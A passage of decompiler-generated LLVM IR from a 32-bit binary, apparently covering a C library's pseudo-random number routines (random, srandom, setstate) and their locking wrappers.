  uselistorder i8* @global_var_805b474.76, { 5, 4, 3, 0, 2, 1 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_804e0dc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050526, { 1, 0 }
  uselistorder label %dec_label_pc_8050515, { 1, 0 }
  uselistorder label %dec_label_pc_80504d3.dec_label_pc_80504d3_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_805049f, { 1, 0 }
  uselistorder label %dec_label_pc_8050467, { 1, 0 }
  uselistorder label %dec_label_pc_8050433.dec_label_pc_8050433_crit_edge, { 1, 0 }
}

define i32 @function_805052c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805052c:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_8050534 = load i32, i32* @ebx, align 4
  %v2_8050542 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050542, i32* @ebx, align 4
  %v2_8050547 = call i32 @function_8050de2(i32 %v2_8050542, i32 134548959)
  %v1_8050553 = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_8055320.77 to i32))
  %v2_805055a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8050564 = call i32 @function_805070d(i32* nonnull @global_var_8055338, i32 %v2_805055a)
  store i32 ptrtoint (i32* @global_var_8055338 to i32), i32* @eax, align 4
  %v2_805056e = call i32 @function_8050de2(i32 %v2_8050542, i32 1)
  %v3_8050573 = load i32, i32* %stack_var_-8, align 4
  store i32 %v0_8050534, i32* @ebx, align 4
  ret i32 %v3_8050573
}

define i32 @function_805057c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805057c:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_805058d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805058d, i32* @eax, align 4
  %v2_8050592 = call i32 @function_8050de2(i32 %v2_805058d, i32 134548959)
  %v1_805059e = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_8055320.77 to i32))
  %v0_80505aa = load i32, i32* bitcast (i32** @global_var_8055340.80 to i32*), align 64
  store i32 %v0_80505aa, i32* @ebx, align 4
  %v3_80505b4 = call i32 @function_8050674(i32 %arg1, i32* nonnull @global_var_8055338)
  %v2_80505bc = icmp slt i32 %v3_80505b4, 0
  br i1 %v2_80505bc, label %dec_label_pc_80505c3, label %dec_label_pc_80505c0

dec_label_pc_80505c0:                             ; preds = %dec_label_pc_805057c
  store i32 ptrtoint (i32** @global_var_805533c.81 to i32), i32* @esi, align 4
  br label %dec_label_pc_80505c3

dec_label_pc_80505c3:                             ; preds = %dec_label_pc_805057c, %dec_label_pc_80505c0
  store i32 %v2_805058d, i32* @eax, align 4
  %v2_80505cc = call i32 @function_8050de2(i32 %v2_805058d, i32 1)
  %v0_80505d1 = load i32, i32* @esi, align 4
  ret i32 %v0_80505d1

; uselistorder directives
  uselistorder label %dec_label_pc_80505c3, { 1, 0 }
}

define i32 @function_80505d9(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80505d9:
  %stack_var_-24 = alloca i32, align 4
  %v2_80505e8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80505e8, i32* @ebx, align 4
  %v2_80505ed = call i32 @function_8050de2(i32 %v2_80505e8, i32 134548959)
  %v1_80505f9 = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_8055320.77 to i32))
  %v0_8050603 = load i32, i32* bitcast (i32** @global_var_8055340.80 to i32*), align 64
  store i32 %v0_8050603, i32* @esi, align 4
  %v4_8050615 = inttoptr i32 %arg2 to i32*
  %v5_8050615 = call i32 @function_8050802(i32 %arg1, i32* %v4_8050615, i32 %arg3, i32 ptrtoint (i32* @global_var_8055338 to i32))
  store i32 %v5_8050615, i32* @eax, align 4
  %v2_8050620 = call i32 @function_8050de2(i32 %v2_80505e8, i32 1)
  ret i32 ptrtoint (i32** @global_var_805533c.81 to i32)
}

define i32 @function_8050630(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050630:
  %stack_var_-20 = alloca i32, align 4
  %v2_805063e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805063e, i32* @ebx, align 4
  %v2_8050643 = call i32 @function_8050de2(i32 %v2_805063e, i32 134548959)
  %v1_805064f = call i32 @function_8050ddf(i32 ptrtoint (i32* @global_var_8055320.77 to i32))
  %v2_805065f = sext i32 %arg1 to i64
  %v3_805065f = call i32 @function_805076c(i64 %v2_805065f, i32 ptrtoint (i32* @global_var_8055338 to i32))
  store i32 ptrtoint (i32* @global_var_8055338 to i32), i32* @eax, align 4
  %v2_8050669 = call i32 @function_8050de2(i32 %v2_805063e, i32 1)
  ret i32 %v2_8050669

; uselistorder directives
  uselistorder i32* @global_var_8055338, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055338 to i32), { 1, 3, 2, 0 }
}

define i32 @function_8050674(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8050674:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8050677 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8050683 = add i32 %arg1, 4
  store i32 %v1_8050683, i32* %esi.global-to-local, align 4
  %v1_8050686 = add i32 %tmp4, 12
  %v2_8050686 = inttoptr i32 %v1_8050686 to i32*
  %v3_8050686 = load i32, i32* %v2_8050686, align 4
  store i32 %v3_8050686, i32* %ecx.global-to-local, align 4
  %v1_8050689 = add i32 %tmp4, 8
  %v2_8050689 = inttoptr i32 %v1_8050689 to i32*
  %v3_8050689 = load i32, i32* %v2_8050689, align 4
  %v1_805068c = icmp eq i32 %v3_8050686, 0
  %v1_805068e = icmp eq i1 %v1_805068c, false
  br i1 %v1_805068e, label %dec_label_pc_8050699, label %dec_label_pc_8050690

dec_label_pc_8050690:                             ; preds = %dec_label_pc_8050674
  %v1_8050690 = add i32 %v3_8050689, -4
  %v2_8050690 = inttoptr i32 %v1_8050690 to i32*
  store i32 0, i32* %v2_8050690, align 4
  br label %dec_label_pc_80506a9

dec_label_pc_8050699:                             ; preds = %dec_label_pc_8050674
  %v1_8050699 = add i32 %tmp4, 4
  %v2_8050699 = inttoptr i32 %v1_8050699 to i32*
  %v3_8050699 = load i32, i32* %v2_8050699, align 4
  %v2_805069c = sub i32 %v3_8050699, %v3_8050689
  %v2_805069e = sdiv i32 %v2_805069c, 4
  %v3_80506a1 = mul i32 %v2_805069e, 5
  %v2_80506a4 = add i32 %v3_80506a1, %v3_8050686
  store i32 %v2_80506a4, i32* %eax.global-to-local, align 4
  %v2_80506a6 = add i32 %v3_8050689, -4
  %v3_80506a6 = inttoptr i32 %v2_80506a6 to i32*
  store i32 %v2_80506a4, i32* %v3_80506a6, align 4
  br label %dec_label_pc_80506a9

dec_label_pc_80506a9:                             ; preds = %dec_label_pc_8050690, %dec_label_pc_8050699
  %v0_80506a9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80506a9 = add i32 %v0_80506a9, -4
  %v2_80506a9 = inttoptr i32 %v1_80506a9 to i32*
  %v3_80506a9 = load i32, i32* %v2_80506a9, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_80506b1 = ashr i32 %v3_80506a9, 31
  %v2_80506b2 = zext i32 %v3_80506a9 to i64
  %v4_80506b2 = zext i32 %v1_80506b1 to i64
  %v5_80506b2 = mul nuw i64 %v4_80506b2, 4294967296
  %v6_80506b2 = or i64 %v5_80506b2, %v2_80506b2
  %v8_80506b2 = sdiv i64 %v6_80506b2, 5
  %v9_80506b2 = trunc i64 %v8_80506b2 to i32
  store i32 %v9_80506b2, i32* %eax.global-to-local, align 4
  %v10_80506b2 = srem i64 %v6_80506b2, 5
  %v11_80506b2 = trunc i64 %v10_80506b2 to i32
  %v6_80506b7 = icmp ugt i32 %v11_80506b2, 4
  br i1 %v6_80506b7, label %dec_label_pc_80506f7, label %dec_label_pc_80506b9

dec_label_pc_80506b9:                             ; preds = %dec_label_pc_80506a9
  %v1_80506b9 = mul i32 %v11_80506b2, 4
  %v2_80506b9 = add i32 %v1_80506b9, ptrtoint (i32* @global_var_8053db4.82 to i32)
  %v3_80506b9 = inttoptr i32 %v2_80506b9 to i32*
  %v4_80506b9 = load i32, i32* %v3_80506b9, align 4
  store i32 %v4_80506b9, i32* %ecx.global-to-local, align 4
  %v2_80506c0 = add i32 %v1_80506b9, ptrtoint (i32* @global_var_8053da0.83 to i32)
  %v3_80506c0 = inttoptr i32 %v2_80506c0 to i32*
  %v4_80506c0 = load i32, i32* %v3_80506c0, align 4
  store i32 %v4_80506c0, i32* %ebp.global-to-local, align 4
  %v1_80506c7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506c7 = add i32 %v1_80506c7, 16
  %v3_80506c7 = inttoptr i32 %v2_80506c7 to i32*
  store i32 %v4_80506b9, i32* %v3_80506c7, align 4
  %v0_80506ca = load i32, i32* %ebp.global-to-local, align 4
  %v1_80506ca = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506ca = add i32 %v1_80506ca, 20
  %v3_80506ca = inttoptr i32 %v2_80506ca to i32*
  store i32 %v0_80506ca, i32* %v3_80506ca, align 4
  %v1_80506cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506cd = add i32 %v1_80506cd, 12
  %v3_80506cd = inttoptr i32 %v2_80506cd to i32*
  store i32 %v11_80506b2, i32* %v3_80506cd, align 4
  %v1_80506d0 = icmp eq i32 %v11_80506b2, 0
  br i1 %v1_80506d0, label %dec_label_pc_80506ea, label %dec_label_pc_80506d4

dec_label_pc_80506d4:                             ; preds = %dec_label_pc_80506b9
  %v0_80506d4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80506d4 = add i32 %v0_80506d4, -4
  %v2_80506d4 = inttoptr i32 %v1_80506d4 to i32*
  %v3_80506d4 = load i32, i32* %v2_80506d4, align 4
  %v1_80506d7 = ashr i32 %v3_80506d4, 31
  %v0_80506d8 = load i32, i32* %edi.global-to-local, align 4
  %v2_80506d8 = zext i32 %v3_80506d4 to i64
  %v4_80506d8 = zext i32 %v1_80506d7 to i64
  %v5_80506d8 = mul nuw i64 %v4_80506d8, 4294967296
  %v6_80506d8 = or i64 %v5_80506d8, %v2_80506d8
  %v7_80506d8 = zext i32 %v0_80506d8 to i64
  %v8_80506d8 = sdiv i64 %v6_80506d8, %v7_80506d8
  %v9_80506d8 = trunc i64 %v8_80506d8 to i32
  %v2_80506da = mul i32 %v9_80506d8, 4
  %v3_80506da = add i32 %v2_80506da, %v0_80506d4
  %v1_80506dd = load i32, i32* %ebp.global-to-local, align 4
  %v2_80506dd = add i32 %v1_80506dd, %v9_80506d8
  store i32 %v2_80506dd, i32* %eax.global-to-local, align 4
  %v1_80506df = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506df = add i32 %v1_80506df, 4
  %v3_80506df = inttoptr i32 %v2_80506df to i32*
  store i32 %v3_80506da, i32* %v3_80506df, align 4
  %v0_80506e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506e2 = ashr i32 %v0_80506e2, 31
  %v0_80506e3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80506e3 = zext i32 %v0_80506e2 to i64
  %v4_80506e3 = zext i32 %v1_80506e2 to i64
  %v5_80506e3 = mul nuw i64 %v4_80506e3, 4294967296
  %v6_80506e3 = or i64 %v5_80506e3, %v2_80506e3
  %v7_80506e3 = zext i32 %v0_80506e3 to i64
  %v8_80506e3 = sdiv i64 %v6_80506e3, %v7_80506e3
  %v9_80506e3 = trunc i64 %v8_80506e3 to i32
  store i32 %v9_80506e3, i32* %eax.global-to-local, align 4
  %v10_80506e3 = srem i64 %v6_80506e3, %v7_80506e3
  %v11_80506e3 = trunc i64 %v10_80506e3 to i32
  %v0_80506e5 = load i32, i32* %esi.global-to-local, align 4
  %v2_80506e5 = mul i32 %v11_80506e3, 4
  %v3_80506e5 = add i32 %v2_80506e5, %v0_80506e5
  %v1_80506e8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506e8 = inttoptr i32 %v1_80506e8 to i32*
  store i32 %v3_80506e5, i32* %v2_80506e8, align 4
  br label %dec_label_pc_80506ea

dec_label_pc_80506ea:                             ; preds = %dec_label_pc_80506b9, %dec_label_pc_80506d4
  %v0_80506ea = load i32, i32* %esi.global-to-local, align 4
  %v1_80506ea = load i32, i32* %ecx.global-to-local, align 4
  %v2_80506ea = mul i32 %v1_80506ea, 4
  %v3_80506ea = add i32 %v2_80506ea, %v0_80506ea
  store i32 %v3_80506ea, i32* %eax.global-to-local, align 4
  %v1_80506ed = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506ed = add i32 %v1_80506ed, 8
  %v3_80506ed = inttoptr i32 %v2_80506ed to i32*
  store i32 %v0_80506ea, i32* %v3_80506ed, align 4
  %v0_80506f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80506f0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80506f0 = add i32 %v1_80506f0, 24
  %v3_80506f0 = inttoptr i32 %v2_80506f0 to i32*
  store i32 %v0_80506f0, i32* %v3_80506f0, align 4
  br label %dec_label_pc_8050705

dec_label_pc_80506f7:                             ; preds = %dec_label_pc_80506a9
  %v1_80506f7 = call i32 @function_804e1ec(i32 %v0_8050677)
  store i32 %v1_80506f7, i32* %eax.global-to-local, align 4
  %v1_80506fc = inttoptr i32 %v1_80506f7 to i32*
  store i32 22, i32* %v1_80506fc, align 4
  br label %dec_label_pc_8050705

dec_label_pc_8050705:                             ; preds = %dec_label_pc_80506ea, %dec_label_pc_80506f7
  %storemerge = phi i32 [ -1, %dec_label_pc_80506f7 ], [ 0, %dec_label_pc_80506ea ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050677, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80506ea, { 1, 0 }
  uselistorder i32 %v11_80506b2, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8050705, { 1, 0 }
  uselistorder label %dec_label_pc_80506ea, { 1, 0 }
  uselistorder label %dec_label_pc_80506a9, { 1, 0 }
}

define i32 @function_805070d(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805070d:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050710 = load i32, i32* @ebx, align 4
  store i32 %v0_8050710, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8050719 = add i32 %tmp2, 8
  %v2_8050719 = inttoptr i32 %v1_8050719 to i32*
  %v3_8050719 = load i32, i32* %v2_8050719, align 4
  store i32 %v3_8050719, i32* %esi.global-to-local, align 4
  %v1_805071c = add i32 %tmp2, 12
  %v2_805071c = inttoptr i32 %v1_805071c to i32*
  %v3_805071c = load i32, i32* %v2_805071c, align 4
  %v4_805071c = icmp eq i32 %v3_805071c, 0
  %v1_8050720 = icmp eq i1 %v4_805071c, false
  br i1 %v1_8050720, label %dec_label_pc_8050739, label %dec_label_pc_8050722

dec_label_pc_8050722:                             ; preds = %dec_label_pc_805070d
  %v2_8050722 = inttoptr i32 %v3_8050719 to i32*
  %v3_8050722 = load i32, i32* %v2_8050722, align 4
  %v5_8050722 = mul i32 %v3_8050722, 1103515245
  %v1_8050728 = add i32 %v5_8050722, 12345
  %v1_805072d = urem i32 %v1_8050728, -2147483648
  store i32 %v1_805072d, i32* %eax.global-to-local, align 4
  store i32 %v1_805072d, i32* %v2_8050722, align 4
  %v0_8050734 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050734 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050734 = inttoptr i32 %v1_8050734 to i32*
  store i32 %v0_8050734, i32* %v2_8050734, align 4
  br label %dec_label_pc_8050765

dec_label_pc_8050739:                             ; preds = %dec_label_pc_805070d
  %v1_8050739 = add i32 %tmp2, 4
  %v2_8050739 = inttoptr i32 %v1_8050739 to i32*
  %v3_8050739 = load i32, i32* %v2_8050739, align 4
  store i32 %v3_8050739, i32* %ecx.global-to-local, align 4
  %v2_805073c = load i32, i32* %arg1, align 4
  store i32 %v2_805073c, i32* %edx.global-to-local, align 4
  %v1_805073e = add i32 %tmp2, 24
  %v2_805073e = inttoptr i32 %v1_805073e to i32*
  %v3_805073e = load i32, i32* %v2_805073e, align 4
  store i32 %v3_805073e, i32* %edi.global-to-local, align 4
  %v1_8050741 = inttoptr i32 %v3_8050739 to i32*
  %v2_8050741 = load i32, i32* %v1_8050741, align 4
  store i32 %v2_8050741, i32* %eax.global-to-local, align 4
  %v1_8050743 = inttoptr i32 %v2_805073c to i32*
  %v2_8050743 = load i32, i32* %v1_8050743, align 4
  %v4_8050743 = add i32 %v2_8050743, %v2_8050741
  store i32 %v4_8050743, i32* %v1_8050743, align 4
  %v0_8050745 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050745 = inttoptr i32 %v0_8050745 to i32*
  %v2_8050745 = load i32, i32* %v1_8050745, align 4
  %v1_8050747 = add i32 %v0_8050745, 4
  store i32 %v1_8050747, i32* %edx.global-to-local, align 4
  %v2_805074a = udiv i32 %v2_8050745, 2
  %v1_805074c = load i32, i32* %edi.global-to-local, align 4
  %v7_805074c = icmp ult i32 %v1_8050747, %v1_805074c
  %v1_805074e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805074e = inttoptr i32 %v1_805074e to i32*
  store i32 %v2_805074a, i32* %v2_805074e, align 4
  %v0_8050751 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050751 = add i32 %v0_8050751, 4
  store i32 %v1_8050751, i32* %eax.global-to-local, align 4
  br i1 %v7_805074c, label %dec_label_pc_805075a, label %dec_label_pc_8050756

dec_label_pc_8050756:                             ; preds = %dec_label_pc_8050739
  %v0_8050756 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050756, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050760

dec_label_pc_805075a:                             ; preds = %dec_label_pc_8050739
  %v1_805075a = load i32, i32* %edi.global-to-local, align 4
  %v7_805075a = icmp ult i32 %v1_8050751, %v1_805075a
  br i1 %v7_805075a, label %dec_label_pc_8050760, label %dec_label_pc_805075e

dec_label_pc_805075e:                             ; preds = %dec_label_pc_805075a
  %v0_805075e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805075e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050760

dec_label_pc_8050760:                             ; preds = %dec_label_pc_805075a, %dec_label_pc_8050756, %dec_label_pc_805075e
  %v0_8050760 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050760 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050760 = inttoptr i32 %v1_8050760 to i32*
  store i32 %v0_8050760, i32* %v2_8050760, align 4
  %v0_8050762 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050762 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050762 = add i32 %v1_8050762, 4
  %v3_8050762 = inttoptr i32 %v2_8050762 to i32*
  store i32 %v0_8050762, i32* %v3_8050762, align 4
  br label %dec_label_pc_8050765

dec_label_pc_8050765:                             ; preds = %dec_label_pc_8050722, %dec_label_pc_8050760
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050767 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050767, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805072d, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050765, { 1, 0 }
  uselistorder label %dec_label_pc_8050760, { 2, 0, 1 }
}

define i32 @function_805076c(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805076c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_805076c = load i32, i32* @ebp, align 4
  %v0_805076d = load i32, i32* @edi, align 4
  %v0_805076e = load i32, i32* @esi, align 4
  %v0_805076f = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_805077a = trunc i64 %arg1 to i32
  store i32 %v4_805077a, i32* %eax.global-to-local, align 4
  %v1_805077e = add i32 %arg2, 12
  %v2_805077e = inttoptr i32 %v1_805077e to i32*
  %v3_805077e = load i32, i32* %v2_805077e, align 4
  store i32 %v3_805077e, i32* %edx.global-to-local, align 4
  %v6_8050784 = icmp ugt i32 %v3_805077e, 4
  br i1 %v6_8050784, label %dec_label_pc_80507f8, label %dec_label_pc_8050786

dec_label_pc_8050786:                             ; preds = %dec_label_pc_805076c
  %v1_8050786 = add i32 %arg2, 8
  %v2_8050786 = inttoptr i32 %v1_8050786 to i32*
  %v3_8050786 = load i32, i32* %v2_8050786, align 4
  store i32 %v3_8050786, i32* %ebx.global-to-local, align 4
  %v1_8050789 = icmp eq i32 %v4_805077a, 0
  %v1_805078b = icmp eq i1 %v1_8050789, false
  br i1 %v1_805078b, label %dec_label_pc_805078f, label %dec_label_pc_805078d

dec_label_pc_805078d:                             ; preds = %dec_label_pc_8050786
  %v1_805078d = and i32 %v4_805077a, -256
  %v2_805078d = or i32 %v1_805078d, 1
  store i32 %v2_805078d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805078f

dec_label_pc_805078f:                             ; preds = %dec_label_pc_8050786, %dec_label_pc_805078d
  %v0_805078f = phi i32 [ %v4_805077a, %dec_label_pc_8050786 ], [ %v2_805078d, %dec_label_pc_805078d ]
  %v2_805078f = inttoptr i32 %v3_8050786 to i32*
  store i32 %v0_805078f, i32* %v2_805078f, align 4
  %v1_8050791 = icmp eq i32 %v3_805077e, 0
  br i1 %v1_8050791, label %dec_label_pc_80507f6, label %dec_label_pc_8050795

dec_label_pc_8050795:                             ; preds = %dec_label_pc_805078f
  %v0_8050795 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8050795, i32* %edx.global-to-local, align 4
  %v0_8050797 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050797, i32* %ecx.global-to-local, align 4
  %v0_8050799 = load i32, i32* @esi, align 4
  %v1_8050799 = add i32 %v0_8050799, 16
  %v2_8050799 = inttoptr i32 %v1_8050799 to i32*
  %v3_8050799 = load i32, i32* %v2_8050799, align 4
  store i32 %v3_8050799, i32* %eax.global-to-local, align 4
  %v4_80507a1 = sext i32 %v3_8050799 to i64
  store i64 %v4_80507a1, i64* %stack_var_-40, align 8
  %v5_80507d322 = icmp sgt i32 %v3_8050799, 1
  br i1 %v5_80507d322, label %dec_label_pc_80507a6, label %dec_label_pc_80507d5

dec_label_pc_80507a6:                             ; preds = %dec_label_pc_8050795, %dec_label_pc_80507ca.dec_label_pc_80507a6_crit_edge
  %v0_80507ca = phi i32 [ %v0_80507ca.pre, %dec_label_pc_80507ca.dec_label_pc_80507a6_crit_edge ], [ %v0_8050797, %dec_label_pc_8050795 ]
  %v0_80507cd = phi i32 [ %v0_80507d0, %dec_label_pc_80507ca.dec_label_pc_80507a6_crit_edge ], [ 1, %dec_label_pc_8050795 ]
  %v0_80507a6 = phi i32 [ %v0_80507a6.pre, %dec_label_pc_80507ca.dec_label_pc_80507a6_crit_edge ], [ %v0_8050795, %dec_label_pc_8050795 ]
  %v1_80507ad = ashr i32 %v0_80507a6, 31
  %v2_80507ae = zext i32 %v0_80507a6 to i64
  %v4_80507ae = zext i32 %v1_80507ad to i64
  %v5_80507ae = mul nuw i64 %v4_80507ae, 4294967296
  %v6_80507ae = or i64 %v5_80507ae, %v2_80507ae
  %v8_80507ae = sdiv i64 %v6_80507ae, 127773
  %v9_80507ae = trunc i64 %v8_80507ae to i32
  %v10_80507ae = srem i64 %v6_80507ae, 127773
  %v3_80507b4 = mul nsw i64 %v10_80507ae, 16807
  %v4_80507b4 = trunc i64 %v3_80507b4 to i32
  %v3_80507ba = mul i32 %v9_80507ae, 2836
  store i32 %v3_80507ba, i32* %eax.global-to-local, align 4
  %v2_80507c0 = sub i32 %v4_80507b4, %v3_80507ba
  %v13_80507c0 = icmp slt i32 %v2_80507c0, 0
  %v1_80507c2 = icmp eq i1 %v13_80507c0, false
  %v1_80507c4 = add i32 %v2_80507c0, 2147483647
  %v2_80507c0.v1_80507c4 = select i1 %v1_80507c2, i32 %v2_80507c0, i32 %v1_80507c4
  store i32 %v2_80507c0.v1_80507c4, i32* %edx.global-to-local, align 4
  %v1_80507ca = add i32 %v0_80507ca, 4
  store i32 %v1_80507ca, i32* %ecx.global-to-local, align 4
  %v1_80507cd = add i32 %v0_80507cd, 1
  store i32 %v1_80507cd, i32* @edi, align 4
  %v2_80507ce = inttoptr i32 %v1_80507ca to i32*
  store i32 %v2_80507c0.v1_80507c4, i32* %v2_80507ce, align 4
  %v0_80507d0 = load i32, i32* @edi, align 4
  %v3_80507d0 = load i64, i64* %stack_var_-40, align 8
  %v4_80507d0 = trunc i64 %v3_80507d0 to i32
  %v5_80507d3 = icmp slt i32 %v0_80507d0, %v4_80507d0
  br i1 %v5_80507d3, label %dec_label_pc_80507ca.dec_label_pc_80507a6_crit_edge, label %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge

dec_label_pc_80507ca.dec_label_pc_80507a6_crit_edge: ; preds = %dec_label_pc_80507a6
  %v0_80507a6.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_80507ca.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80507a6

dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge: ; preds = %dec_label_pc_80507a6
  %v0_80507d5.pre = load i32, i32* @esi, align 4
  %v0_80507d8.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80507d5

dec_label_pc_80507d5:                             ; preds = %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge, %dec_label_pc_8050795
  %v0_80507d8 = phi i32 [ %v0_80507d8.pre, %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge ], [ %v0_8050797, %dec_label_pc_8050795 ]
  %v0_80507d5 = phi i32 [ %v0_80507d5.pre, %dec_label_pc_80507d0.dec_label_pc_80507d5_crit_edge ], [ %v0_8050799, %dec_label_pc_8050795 ]
  %v1_80507d5 = add i32 %v0_80507d5, 20
  %v2_80507d5 = inttoptr i32 %v1_80507d5 to i32*
  %v3_80507d5 = load i32, i32* %v2_80507d5, align 4
  store i32 %v3_80507d5, i32* %eax.global-to-local, align 4
  %v2_80507d8 = add i32 %v0_80507d5, 4
  %v3_80507d8 = inttoptr i32 %v2_80507d8 to i32*
  store i32 %v0_80507d8, i32* %v3_80507d8, align 4
  %v0_80507db = load i32, i32* %ebx.global-to-local, align 4
  %v1_80507db = load i32, i32* %eax.global-to-local, align 4
  %v2_80507db = mul i32 %v1_80507db, 4
  %v3_80507db = add i32 %v2_80507db, %v0_80507db
  store i32 %v3_80507db, i32* %eax.global-to-local, align 4
  %v1_80507de = load i32, i32* @esi, align 4
  %v2_80507de = inttoptr i32 %v1_80507de to i32*
  store i32 %v3_80507db, i32* %v2_80507de, align 4
  %v3_80507e0 = load i64, i64* %stack_var_-40, align 8
  %v6_80507e0 = mul nsw i64 %v3_80507e0, 10
  %v7_80507e0 = trunc i64 %v6_80507e0 to i32
  %v1_80507f34 = add i32 %v7_80507e0, -1
  %v9_80507f39 = icmp slt i32 %v1_80507f34, 0
  store i32 %v1_80507f34, i32* @ebx, align 4
  %v1_80507f410 = icmp eq i1 %v9_80507f39, false
  br i1 %v1_80507f410, label %dec_label_pc_80507e6.lr.ph, label %dec_label_pc_80507f6

dec_label_pc_80507e6.lr.ph:                       ; preds = %dec_label_pc_80507d5
  %v2_80507e6 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_80507e6

dec_label_pc_80507e6:                             ; preds = %dec_label_pc_80507e6.lr.ph, %dec_label_pc_80507e6
  store i32 %v2_80507e6, i32* %eax.global-to-local, align 4
  %v0_80507eb = load i32, i32* @esi, align 4
  %v2_80507ec = inttoptr i32 %v0_80507eb to i32*
  %v3_80507ec = call i32 @function_805070d(i32* %v2_80507ec, i32 %v2_80507e6)
  store i32 %v0_80507eb, i32* %eax.global-to-local, align 4
  store i32 %v2_80507e6, i32* %edx.global-to-local, align 4
  %v0_80507f3 = load i32, i32* @ebx, align 4
  %v1_80507f3 = add i32 %v0_80507f3, -1
  %v9_80507f3 = icmp slt i32 %v1_80507f3, 0
  store i32 %v1_80507f3, i32* @ebx, align 4
  %v1_80507f4 = icmp eq i1 %v9_80507f3, false
